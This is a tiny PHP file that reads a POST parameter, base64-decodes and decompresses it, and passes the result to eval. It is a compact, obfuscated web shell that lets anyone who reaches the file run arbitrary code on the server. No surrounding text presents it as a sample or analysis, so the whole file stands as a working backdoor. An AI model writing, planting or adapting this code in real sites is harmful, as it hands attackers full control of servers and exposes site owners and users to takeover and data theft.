<?php
$payload = $_POST['x'];
eval(gzinflate(base64_decode($payload)));
